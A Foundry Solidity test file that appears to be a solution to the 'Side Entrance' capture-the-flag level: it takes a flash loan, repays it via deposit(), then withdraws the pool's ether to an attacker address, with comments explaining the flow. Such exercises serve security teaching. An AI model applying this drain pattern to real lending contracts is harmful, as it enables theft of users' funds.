// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {SideEntranceLenderPool} from "../src/SideEntranceLenderPool.sol";

contract SideEntrance is Test {
    uint256 internal constant ETHER_IN_POOL = 1_000e18;

    Utilities internal utils;
    SideEntranceLenderPool internal sideEntranceLenderPool;
    address payable internal attacker;
    uint256 public attackerInitialEthBalance;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];
        vm.label(attacker, "Attacker");

        sideEntranceLenderPool = new SideEntranceLenderPool();
        vm.label(address(sideEntranceLenderPool), "Side Entrance Lender Pool");

        vm.deal(address(sideEntranceLenderPool), ETHER_IN_POOL);

        assertEq(address(sideEntranceLenderPool).balance, ETHER_IN_POOL);

        attackerInitialEthBalance = address(attacker).balance;

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         * 
         */
        sideEntranceLenderPool.flashLoan(address(sideEntranceLenderPool).balance);
        steal();
        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations");
    }

        /**
         * IN A REAL WORLD SCENARIO, THIS FUNCTION WOULD BE IN A SEPARATE CONTRACT
         * THE WAY IT WORKS IS THAT ONCE THE FLASHLOAN FUNCTION `sideEntranceLenderPool.flashLoan(address(sideEntranceLenderPool).balance);` IS CALLED
         * THE execute FUNCTION IS CALLED WHICH RUNS `sideEntranceLenderPool.deposit{value: msg.value }()`.
         * IT THEN CALLS THE STEAL FUNCTION WHICH CALLS THE WITHDRAW FUNCTION OF THE LOAN CONTRACT
         * THE EXECUTE FUNCTION SHOULD CONTAIN THE LOGIC YOU WANNA ACHIEVE I.E THE TRANSACTION YOU WANT TO DO.
         * IN THIS CASE, IT IS CALLING THE STEAL FUNCTION WHICH CALLS THE WITHDRAW FUNCTION OF THE LOAN CONTRACT,
         * BUT IN A REAL WORLD CONTRACT IT WILL BE YOUR OWN LOGIC LIKE DOING A TRADE OR WHATEVER.
         * AFTER EXECUTING WHATEVER ACTIVITY THAT WILL INCREASE THE BALANCE OF THE CONTRACT,
         * YOU THEN TRANSFER THE BALANCE TO THE ATTACKER ADDRESS
         * THERE IS AN AUTOMATIC WITHDRAWAL FUNCTION ON THE LOAN CONTRACT THAT WILL TAKE BACK THE FUNDS.
         **/
        function execute() external payable {
            sideEntranceLenderPool.deposit{value: msg.value }();
        }

        function steal() public payable {
            sideEntranceLenderPool.withdraw();
            payable(attacker).transfer(address(this).balance);
        }

        // write a fallback function to receive ether
        receive() external payable {}

        function validation() internal {
            assertEq(address(sideEntranceLenderPool).balance, 0);
            assertGt(attacker.balance, attackerInitialEthBalance);
        }
    }
